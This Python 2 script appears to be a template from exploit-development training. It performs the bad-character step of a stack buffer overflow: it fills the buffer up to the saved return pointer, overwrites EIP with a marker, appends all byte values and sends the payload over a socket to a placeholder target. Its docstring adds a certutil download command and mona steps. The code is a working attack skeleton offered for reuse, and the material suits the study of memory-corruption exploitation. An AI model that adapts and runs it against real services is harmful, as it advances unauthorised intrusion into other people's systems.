#!/usr/bin/python

import socket, struct

RHOST = '<ip>'
RPORT = <port>
cmd = '<command>'
offset_srp = <offset>
buf_totlen = <buffer length>

"""
######################################################

Find bad characters

The null byte is always bad and is included in the script.
You must add any other bad characters to line 32 below and run the test again.
When the log data shows no bad chars and 'Unmodified' you are good.

	a. Run the bad char test and copy over the bin file to the Win box

	 - certutil.exe -urlcache -split -f "http://192.168.XX.XX/badchar_test.bin"
	
	b. !mona compare -a esp -f C:\badchar_test.bin  (From Crashed State)_

	c. Add any found bad chars to the loop and re-do steps a and b until mona shows "unmodified"

######################################################
"""
###################
badchar_test = ""
badchars = [0x00]	# Add known bad characters here (e.g. [0x00,0x0A])
## generate the string
for i in range(0x00, 0xFF+1):
	if i not in badchars:
		badchar_test += chr(i)
## open a file for writing ("w") the string as binary ("b") data
with open("badchar_test.bin", "wb") as f:
	f.write(badchar_test)
####################

buf = ""
buf += "A" * (offset_srp - len(buf))    # Send the A's up to the EIP
buf += "BBBB"                           # Killer B's attack the EIP
buf += badchar_test                     # Looking for shady players
buf += "C" * (buf_totlen - len(buf))    # C ya later
buf += "\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))
s.send(cmd + buf)   ## Comment out if cmd function not needed
## s.send(buf)      ## Uncomment if cmd function not needed
s.recv(1024)
s.close()

